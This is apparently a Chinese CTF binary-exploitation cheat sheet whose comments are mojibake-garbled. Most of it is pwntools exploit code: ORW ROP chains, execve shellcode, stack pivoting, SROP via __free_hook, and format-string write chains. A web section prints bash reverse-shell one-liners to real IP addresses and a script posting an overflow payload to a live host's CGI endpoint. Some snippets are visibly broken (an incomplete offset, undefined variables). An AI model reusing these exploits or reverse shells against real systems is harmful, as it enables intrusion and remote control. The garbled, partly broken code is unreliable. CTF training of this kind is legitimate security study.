pay = p64(pop_rax)+p64(2)+p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(syscall)
pay += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss+0x100)+p64(pop_rdx)+p64(0x30)+p64(Read)
pay += p64(pop_rdi)+p64(1)+p64(Write)
```


Open->openat å¯èƒ½ä¼šä¸å¯ç”¨

```python
pay = p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(Open)
pay += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss+0x100)+p64(pop_rdx)+p64(0x30)+p64(Read)
pay += p64(pop_rdi)+p64(1)+p64(Write)
```



orw-shellcode æ±‡ç¼–

```python
nop #1å­—èŠ‚
pop rdi # 1å­—èŠ‚
xor esi, esi #2å­—èŠ‚
xor rsi, rsi #3å­—èŠ‚
sub rsp, 0x30 #4å­—èŠ‚
jmp rsp #2å­—èŠ‚
mov rax, 0 #7å­—èŠ‚ 
mov eax, 0 #5å­—èŠ‚
syscall #2å­—èŠ‚
```

#### æ‰‹æ“shellcodeæ±‡ç¼–

```
execve()

mov rbx, 0x0068732f6e69622f
push rbx
mov rdi,rsp
mov rsi,0
mov rdx,0
mov rax,59
syscall


    xor edi, edi
    xchg rsi, rdx
    add rsi, 0xb
    syscall



```

#### æ ˆè¿ç§»/orw_shellcode

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
# p = process('./ld-2.33.so ./TinyNote'.split(),env={'LD_PRELOAD':'./libc-2.33.so'})
p = process("./heap2019")
elf = ELF("./heap2019")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
# context.terminal = ['cmd.exe', '/c', 'wt.exe', '-w', '0','--title', 'gdb', 'bash', '-c']
context.terminal = ['tmux', 'splitw', '-hp','60']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

pop_rdi = 0x0000000000401393
pop_rsi = 0x0000000000401391
ret = 0x000000000040101a

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

read = 0x4012CF
main = 0x4012C0
bss = 0x404200
#-------------------æ³„éœ²libc-------------------------
# å¦‚æœä¸€ç‚¹éƒ½ä¸å¤Ÿå°±ç›´æ¥æ ˆè¿ç§»ï¼Œæ³„éœ²ä»¥åå†ç»§ç»­æ ˆè¿ç§»
ru("before you try to solve this task.")
pay = 'a'*0x100+p64(bss)+p64(read)
s(pay)
pay = 'a'*0x100+p64(bss+0x100)+p64(read)
s(pay)
pay = p64(0)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
s(pay)

# å¦‚æœæœ‰ä¸€å®šç©ºé—´ï¼ˆ>=0x20ï¼‰å¯å®ç°æ ˆè¿ç§»
pay = 'a'*0x20+p64(bss)+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(read)
s(pay)
pay = 'a'*0x20+p64(bss+0x20)+p64(read)
s(pay)# åç»­å°±å¯ä»¥orwæˆ–è€…mprotectæ”¹æƒé™


# å¦‚æœä»…æœ‰readå‡½æ•°çš„æƒ…å†µ



libc_base = l64()-0x
lg('libc_base')
pop_rdx = libc_base + 0x0000000000142c92
jmp_rsp = libc_base+0x0000000000002b25
Open = libc_base+libc.sym['open']
Read = libc_base+libc.sym['read']
Write = libc_base+libc.sym['write']
# äºŒé€‰ä¸€
# mprotect = libc_base + libc.sym['mprotect']
# syscall = libc_base + 0xd2625

flag = 'flag'
pay = p64(0)+p64(pop_rdi)+p64(bss-0x500)
pay += p64(pop_rsi)+p64(0x1000)
pay += p64(pop_rdx)+p64(7)
pay += p64(pop_rax)+p64(10)
pay += p64(syscall)
pay += p64(jmp_rsp)
pay += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (bss+0x100))# read(0,rsi,0x100);jmp rsi
ru("let me guess\n")
s(payload)

# å¯ç”¨çš„shellcode
# get flagname
pay = asm(shellcraft.open('./'))
pay += asm(shellcraft.getdents64(3, bss+0x300, 0x100))
pay += asm(shellcraft.write(1, bss+0x300, 0x100))
pay += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (main))# ç­‰ä»·äºcall main
s(pay)
ru("flag")
flagname='flag'+p.recv(20)
print(flagname)

# cat flag 1
flag = 'flag'
pay = asm(shellcraft.cat(flag))
pay += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (bss+0x100))# read(0,rsi,0x100);jmp rsi
s(pay)
# cat flag 2
pay += asm(shellcraft.open((flagname)))
pay += asm(shellcraft.read(3, bss+0x700, 0x400)) # pay += shellcraft.read(3,'rsp',0x100)
pay += asm(shellcraft.write(1,bss+0x700, 0x400)) # pay += shellcraft.write(1,'rsp',0x100)
pay += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (main))
s(pay)

#--------------------ç›´æ¥orw----------------------
flag = 0x404200
pay = 'flag'.ljust(8,'\x00')+p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)*2+p64(pop_rdx)+p64(0)+p64(Open)
pay += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(0x404200)+p64(0)+p64(pop_rdx)+p64(0x30)+p64(Read)
pay += p64(pop_rdi)+p64(1)+p64(Write)
sl(pay)

ia()
```

#### orwæ¶‰åŠåˆ°å †ï¼Œå°±éœ€è¦sropæ¥free_hookæ®µæ”¹æƒé™å®ç°orw

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
# p = process('./ld-2.33.so ./TinyNote'.split(),env={'LD_PRELOAD':'./libc-2.33.so'})
p = process("./heap2019")
elf = ELF("./heap2019")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
# context.terminal = ['cmd.exe', '/c', 'wt.exe', '-w', '0','--title', 'gdb', 'bash', '-c']
context.terminal = ['tmux', 'splitw', '-hp','60']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(size):
    sla("4.show\n",'1')
    sla("Size of Heap : \n",size)

def dele(idx):
    sla("4.show\n",'2')
    sla("Index :\n",idx)

def edit(idx,size,con):
    sla("4.show\n",'3')
    sla("Index :\n",idx)
    sla("Size of Heap : \n",size)
    sa("Content of heap : \n",con)
def show(idx):
    sla("4.show\n",'4')
    sla("Index :\n",idx)

#------------------------æ³„éœ²libc------------------------------
# å †çš„æ€è·¯æ¯”è¾ƒå¤æ‚,é¦–å…ˆåˆ©ç”¨æ¼æ´ç‚¹æ³„éœ²libc
pop_rdi = libc_base+libc.search(asm("pop rdi\nret")).next()
pop_rsi = libc_base+libc.search(asm("pop rsi\nret")).next()
pop_rdx = libc_base+libc.search(asm("pop rdx\nret")).next()
pop_rax = libc_base+libc.search(asm("pop rax\nret")).next()
jmp_rsp = libc_base+libc.search(asm("jmp rsp")).next()
syscall = libc_base+libc.search(asm("syscall\nret")).next()
mprotect = libc_base + libc.sym['mprotect']

# mov rax, dword ptr [rdi + 0x20]; mov rbp, rdi;test rax, rax; je 0x34fe3; call rax;è·³è½¬è‡³rdi+0x20
gadget = libc_base+0x0000000000034fd5
free_hook_base = (libc_base+libc.sym["__free_hook"]) & 0xfffffffffffff000
pop3_ret = libc_base+0x00000000000e6ce5
leave_ret = libc_base+0x000000000005a9a8
pop_rsp = libc_base+0x000000000002709c
# åŠ«æŒfree_hook-0xa0,å†™å…¥
pay  = p64(0)+p64(pop3_ret)+p64(0)*2+p64(leave_ret)#<-å¼€å§‹æ‰§è¡Œ
pay += p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(free_hook_base)
pay += p64(pop_rdx_r12)+p64(0x1000)*2+p64(pop_rax)+p64(0)
pay += p64(syscall)# read
pay += p64(pop_rsp)+p64(free_hook_base)# jmp rsp
pay  = payload.ljust(0xa0,"\x00")
# print len(pay)
pay += p64(gadget)
sla(">>",pay)

pay = p64(pop_rdi)+p64(free_hook_base)+p64(pop_rsi)+p64(0x2000)# mprotectæ”¹free_hookæ®µçš„æƒé™æ‰§è¡Œshellcode
pay += p64(pop_rdx_r12)+p64(7)+p64(7)+p64(pop_rax)+p64(10)+p64(syscall)+p64(free_hook_base+0x70)
sc  = shellcraft.open("flag");
sc += shellcraft.read(3,free_hook_base+0x300,0x100)
sc += shellcraft.write(1,free_hook_base+0x300,0x100)

sl(pay.ljust(0x70,"\x00")+asm(sc))
#--------------------------------------------------------------
# mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; SROP+setcontext
gadget = libc_base+0x0000000000034fd5
free_hook_base = (libc_base+libc.sym["__free_hook"]) & 0xfffffffffffff000
setcontext = libc_base+libc.sym['setcontext']+61
frame = SigreturnFrame()# è¿™ä¸ªæ¡†æ¶çš„åœ°å€è¦èµ‹ç»™rdx
frame.rsp = libc_base + libc.sym['__free_hook']+0x10# 2
frame.rdi = free_hook_base
frame.rsi = 0x1000
frame.rdx = 7
frame.rip = libc_base + libc.sym['mprotect']# 1

# åŠ«æŒåˆ°free_hook-0x150,å†™å…¥
frame_addr = libc_base+libc.sym["__free_hook"]-0x150+0x10
pay = p64(0)+p64(frame_addr)+p64(0)*4+p64(setcontext)+str(frame)[0x28:]# 0x28æ­£å¥½è¡¥é½å³ä»+0x10å¼€å§‹
pay = payload.ljust(0x150,'\x00')
pay += p64(gadget)
pay += p64(0)+p64(libc_base+libc.sym["__free_hook"]+0x18)#2
pay += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (free_hook_base))
sla(">>",pay)

dele(free_hook-0x150)# *
# orw
sc = asm(shellcraft.cat('flag'))
sc += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (free_hook_base+0x100))
s(sc)
ia()
```



### Pwn with Web ğŸ’»




![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240123211043.png)



```python
# åˆ›å»ºåå‘ shell ï¼Œå¹¶å°†å…¶è¾“å…¥å’Œè¾“å‡ºéƒ½é‡å®šå‘åˆ°ä¸€ä¸ªè¿œç¨‹æœåŠ¡å™¨
cmd = 'bash -c "bash -i >& /dev/tcp/39.102.55.191/9999 0>&1"\x00'
sh -c "sh -i >& /dev/tcp/150.158.144.112/1234 0>&1"\x00
# nc -lvvp 1234
```

å‘åŒ…

```python
from pwn import *
import requests

cookies = {
    'session': 'eyJ1c2VybmFtZSI6Ims0bjk2NiJ9.ZI_LbQ.56KQg3j3spZksRCrTnhkoOu3238',
}

headers = {
    'Accept': '*/*',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Cache-Control': 'max-age=0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://94.74.101.210:50644',
    'Proxy-Connection': 'keep-alive',
    'Referer': 'http://94.74.101.210:50644/',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
}


vip = 0x401129
main = 0x400FF9
payload = b'a'.ljust(0xe8,b'a') + p64(vip) + p64(main)

response = requests.post('http://94.74.101.210:50644/vip.cgi', headers=headers, cookies=cookies, data=payload, verify=False)


print(response.text)
```

å¢åŠ æœ¬åœ°è®¿é—®

```http
Client-Ip: 127.0.0.1
X-Forwarded-For: 127.0.0.1
```


#### gRPC(è¿œç¨‹è¿‡ç¨‹è°ƒç”¨)

https://grpc.io/docs/languages/go/quickstart/

åŸºäº ProtoBuf(Protocol Buffers) åºåˆ—åŒ–åè®®å¼€å‘ï¼Œä¸”æ”¯æŒä¼—å¤šå¼€å‘è¯­è¨€

gprcçš„ä½¿ç”¨æµç¨‹ä¸€èˆ¬æ˜¯è¿™æ ·çš„ï¼š

1. å®šä¹‰æ ‡å‡†çš„protoæ–‡ä»¶(åé¢éƒ¨åˆ†ä¼šè¯¦ç»†è®²è§£protobufçš„ä½¿ç”¨)
2. ç”Ÿæˆæ ‡å‡†ä»£ç 
3. æœåŠ¡ç«¯ä½¿ç”¨ç”Ÿæˆçš„ä»£ç æä¾›æœåŠ¡(å‚è€ƒå„ä¸ªè¯­è¨€çš„ä½¿ç”¨)
4. å®¢æˆ·ç«¯ä½¿ç”¨ç”Ÿæˆçš„ä»£ç è°ƒç”¨æœåŠ¡(å‚è€ƒå„ä¸ªè¯­è¨€çš„ä½¿ç”¨)










#### Protobuf
```shell
# å®‰è£… Go çš„åè®®ç¼–è¯‘å™¨æ’ä»¶
go install google.golang.org/protobuf/cmd/protoc-gen-go@v1.28
go install google.golang.org/grpc/cmd/protoc-gen-go-grpc@v1.2
```

proto

```json
// Copyright 2015 gRPC authors.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

syntax = "proto3";

//å¯¼å…¥è·¯å¾„
option go_package = "google.golang.org/grpc/examples/helloworld/helloworld";
option java_multiple_files = true;
option java_package = "io.grpc.examples.helloworld";
option java_outer_classname = "HelloWorldProto";

package helloworld;

// The greeting service definition.
service Greeter {
  // Sends a greeting
  rpc SayHello (HelloRequest) returns (HelloReply) {}
}

// The request message containing the user's name.
message HelloRequest {
  string name = 1;
}

// The response message containing the greetings
message HelloReply {
  string message = 1;
}

```

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240316123038.png)





```shell
// protoc --python_out=./ ./ctf.proto
// ctf.proto        to      ctf_pb2.py

# -*- coding: utf-8 -*-
# Generated by the protocol buffer compiler.  DO NOT EDIT!
# source: ctf.proto
"""Generated protocol buffer code."""
from google.protobuf import descriptor as _descriptor
from google.protobuf import descriptor_pool as _descriptor_pool
from google.protobuf import symbol_database as _symbol_database
from google.protobuf.internal import builder as _builder
# @@protoc_insertion_point(imports)

_sym_db = _symbol_database.Default()




DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\tctf.proto\x12\x03\x63tf\")\n\x03pwn\x12\x10\n\x08username\x18\x01 \x01(\x0c\x12\x10\n\x08password\x18\x02 \x01(\x0c')

_globals = globals()
_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, _globals)
_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, 'ctf_pb2', _globals)
if _descriptor._USE_C_DESCRIPTORS == False:

  DESCRIPTOR._options = None
  _globals['_PWN']._serialized_start=18
  _globals['_PWN']._serialized_end=59
# @@protoc_insertion_point(module_scope)




```




### canaryç»•è¿‡ğŸ¦
#### leak canary

é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæˆ–è€…æº¢å‡ºå»æ³„éœ²(è¿™ç§æƒ…å†µéœ€è¦è¿‡ç¨‹ä¸­æ²¡æœ‰checkä»£ç ï¼Œåˆ°äº†ä¸‹ä¸€ä¸ªcheckç‚¹æ¢å¤å³å¯)


#### çˆ†ç ´canary

åœ¨å¤šè¿›ç¨‹æ—¶ï¼Œæ¯ä¸ªå­è¿›ç¨‹çš„canaryéƒ½æ˜¯ç›¸åŒçš„ã€‚å› æ­¤å¯ä»¥é‡‡ç”¨one-by-oneçš„æ–¹å¼æ¥å¯¹canaryè¿›è¡Œçˆ†ç ´

#### åŠ«æŒTLSç»•è¿‡canary

æ¯ä¸ªçº¿ç¨‹éƒ½ä¼šæœ‰ä¸€ä¸ªTLSï¼Œæº¢å‡ºè¶³å¤Ÿå¤§çš„å­—èŠ‚è¦†ç›–åˆ°TLSç»“æ„ä½“ï¼Œæ ¡éªŒcanaryæ—¶ä¼šé€šè¿‡fsç»“æ„ä½“ä¸­çš„å€¼å’Œå½“å‰çš„canaryè¿›è¡Œæ¯”å¯¹ï¼Œè‹¥ä¸åŒåˆ™æŠ¥é”™ã€‚

##### å­è¿›ç¨‹

å­è¿›ç¨‹ä¸­è¯¥ç»“æ„ä½“å’Œæ ˆéƒ½ä½¿ç”¨mmapæ˜ å°„åˆ°äº†åŒä¸€ä¸ªæ®µä¸­ï¼Œä¸”å…¶åœ°å€æ¯”å­è¿›ç¨‹çš„æ ˆé«˜ã€‚å› æ­¤ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡æ ˆæº¢å‡ºæ¥è¦†ç›–æ‰tlsç»“æ„ä½“ã€‚å³åœ¨å­è¿›ç¨‹ä¸­è‹¥æ ˆå­˜åœ¨é•¿åº¦æå¤§çš„æº¢å‡ºï¼Œå¯ä»¥è¦†ç›–TLSæ¥è¦†ç›–canaryã€‚æº¢å‡ºå­—èŠ‚éœ€è¦å¤Ÿå¤§ï¼Œé€šå¸¸è‡³å°‘ä¸€ä¸ªpageï¼ˆ4Kï¼‰1024B

##### ä¸»è¿›ç¨‹

ä¸»è¿›ç¨‹ä¸­tlsç»“æ„ä½“ä»ç„¶ä½äºæ˜ å°„æ®µï¼Œä½†æˆ‘ä»¬çŸ¥é“æ˜ å°„æ®µå®é™…ä¸Šæ˜¯åŸºäºlibcåœ°å€çš„ä¸€ä¸ªåç§»ã€‚å› æ­¤ï¼Œè¦ä¿®æ”¹tlsç»“æ„ä½“åŸºæœ¬ä¸Šä¸èƒ½é€šè¿‡ç®€å•çš„æ ˆæº¢å‡ºï¼Œè€Œæ˜¯å¯ä»¥è€ƒè™‘æœ‰libcåœ°å€çš„æƒ…å†µä¸‹æ‰“ä¸€ä¸ªä»»æ„åœ°å€å†™ï¼Œæˆ–è€…æ˜¯mallocä¸€ä¸ªå¾ˆå¤§çš„å†…å­˜ï¼Œä½¿å…¶é€šè¿‡mmapåˆ†é…åˆ°æ˜ å°„æ®µå‰é¢ï¼Œç„¶åé€šè¿‡å †å—æº¢å‡ºæ¥ä¿®æ”¹tlsç»“æ„ä½“çš„å€¼

å½’æ ¹åˆ°åº•ï¼Œå­è¿›ç¨‹çš„tlsç»“æ„ä½“åŒæ ·ä¹Ÿåœ¨æ˜ å°„æ®µä¸Šï¼Œåªæ˜¯å› ä¸ºå­è¿›ç¨‹çš„æ ˆä¹Ÿæ˜¯æ˜ å°„å‡ºæ¥çš„ï¼Œå› æ­¤å¯ä»¥ç›´æ¥æ ˆæº¢å‡ºæ¥ä¿®æ”¹ã€‚


#### åŠ«æŒ stack_chk_failçš„gotè¡¨



###  printf/scanfæ—å‡½æ•°çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´

%s ä¼šæŠŠç¬¬äºŒä¸ªå‚æ•°ä½œä¸ºæŒ‡é’ˆå˜é‡ï¼Œå¼•ç´¢æŒ‡é’ˆå€¼

å…³äºå‡å»å­—èŠ‚æ•°
%æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œpæ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œæ•°å­—éƒ¨åˆ†æŒ‰10è¿›åˆ¶ç®—ï¼Œä¸€ä¸ªæ•°å­—æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œhæ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œnæ˜¯ä¸€ä¸ªå­—èŠ‚
ä½†æ˜¯å‡å»å‰è¾¹çš„å­—èŠ‚æ•°ä¸åŒ…æ‹¬å½“å‰çš„è¿™ä¸ª%å·ï¼å³
%2p   å‡2

####  éæ ˆä¸Šä¸€æ¬¡æ”¹ebpé“¾

%nä¿®æ”¹é™¤äº†æŒ‡å®šåç§»çš„æ–¹å¼ï¼Œè¿˜å¯ä»¥ç”¨é»˜è®¤åç§»ä¿®æ”¹ï¼Œå¤šä½™çš„éƒ¨åˆ†å¯ä»¥ç”¨%pè¿›è¡Œå¡«å……(å¡«å……çš„é•¿åº¦ä¸º%pè¾“å‡ºçš„å†…å®¹æ€»é•¿)

ä¸€æ¬¡printfæ ¼å¼åŒ–å­—ç¬¦ä¸²æŠŠæ‰€æœ‰çš„$çš„nå†™å…¥å‡†å¤‡å¥½å†ä¸€æ¬¡ç»Ÿä¸€å†™å…¥ï¼Œæ‰€ä»¥ä¸ç”¨ $å°±å¯ä»¥ä¸€æ¬¡å†™2å›
é™¤äº†èƒ½å†™2å›ï¼Œè¿˜å¯ä»¥æ³„éœ²å‡ºä¸€å®šçš„åœ°å€ï¼Œå¦‚æœå†™2å›æ„é€ å¾ªç¯å³å¯æ”¹å‡ºone_gadget

fmtå·¥å…·çœ‹ä¸‹ç¬¬ä¸€æ¬¡æ”¹çš„åœ°å€åç§»ï¼Œå¦‚æœæ˜¯11 å°±ç»™11-2ä¸ªp

```python
pay = "%p"*0x9+ '%'+str((ret & 0xffff)-0x65)+'c%hn'  # %på 9ä¸ªä½ç½®å‰©ä¸‹2ä¸ªä½ç½®ä¸€ä¸ª%å ä¸€ä¸ªï¼Œæ°å¥½åˆ°11ä¹Ÿå°±æ˜¯æˆ‘è¦æ”¹çš„åç§»ï¼Œ0x65ä¸º%pè¾“å‡ºå†…å®¹çš„æ€»é•¿

pay += '%' + str((0x23+0xd8)) + 'c%37$hhn' # è®°å¾—å‡å»å‰è¾¹çš„é•¿åº¦ï¼Œè¿™é‡Œé•¿åº¦å»ºè®®åŠ¨è°ƒç¡®è®¤

s(pay)

# print(hex(len('0x5624b86d10400x1000x7f67d9d161510xb(nil)0x7ffcdaca6cf00x93e041eb8ec261000x5624b86ce2600x7f67d9c27bf7')))
# 0x65
```

#### æ ˆä¸Š

```python
# fmtstr_payload
payload ="%2c%310$hhn;%310$p".ljust(0x18)# ä¿®æ”¹æ ˆä¸Šçš„æŸä¸ªå€¼ä¸º2/æ³„éœ²libc
payload += fmtstr_payload(9,{ret_addr:start}, numbwritten=0x17)# ä¿®æ”¹è¿”å›åœ°å€ä¸ºstart


# ç¬¬ä¸€ä¸ªå‚æ•°ï¼šfmtstrå¼€å§‹çš„åœ°æ–¹çš„åç§»(é¢˜ç›®è¾“å…¥åç§»æ˜¯6ï¼Œfmtstr_payloadå¼€å§‹çš„åœ°æ–¹åç§»æ˜¯9)
# ç¬¬äºŒä¸ªå‚æ•°ï¼šret_addr : aaa -> bbb  å°†aaaæ”¹ä¸ºstart
# ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnumbwritten: fmtstr_payloadç”¨%cæ„æˆè¯»å…¥å­—èŠ‚æ•°ï¼Œè¿™é‡Œfmtstr_payloadå‰è¾¹æœ‰å†…å®¹æ‰€ä»¥è¦å‰ªæ‰å­—èŠ‚é•¿,0x17 = 0x18-1

```



#### å †ä¸Š

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("127.0.0.1","10000")
p = process("./shell")
elf = ELF("./shell")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

# æ³„éœ²libcå’Œæ ˆåœ°å€
sa("> ",'echo '+'%6$p-%10$p')
sa("> ",'cat')
ru('0x')
libc_base = int(p.recv(12),16)-libc.sym['_IO_file_jumps']
lg('libc_base')
one = libc_base + 0xe3b01 
lg('one')
ru('0x')
stack_addr= int(p.recv(12),16)
lg('stack_addr')
ret = stack_addr+0x8
lg('ret')

# aaa(%17$p) : bbb(%45$p) -> ccc 
# aaa(%17$p) : bbb(%45$p) -> ret -> libc_function
# æ”¹aaaçš„åç§»å³æ”¹ccc

sa("> ",'echo '+'%' + str(ret & 0xffff) + 'c%17$hn')
sa("> ",'cat')

sa("> ",'echo '+'%' + str(one & 0xffff) + 'c%45$hn')
sa("> ",'cat')

sa("> ",'echo '+'%' + str((ret+2) & 0xffff) + 'c%17$hn')
sa("> ",'cat')

sa("> ",'echo '+'%' + str(one>>16 & 0xff) + 'c%45$hhn')
sa("> ",'cat')

sa("> ",'exit\n')

ia()
```

#### bssä¸Š

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

p = remote('node4.buuoj.cn', 29966) 
# p = process("./playfmt")
elf = ELF("./playfmt")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

buf = 0x804A060+0x4
shellcode = asm(shellcraft.i386.linux.sh())

sl("%6$p")
ru("0x")
stack = int(p.recv(8),16)
lg('stack')
ret = stack-0xc

pay = '%' + str(ret & 0xff) + 'c%6$hhn'
pay = pay.ljust(200,'\x00')
s(pay)

pay = '%' + str(buf & 0xffff) + 'c%10$hn'
pay = pay.ljust(200,'\x00')
s(pay)

pay = 'quit' + shellcode
s(pay)

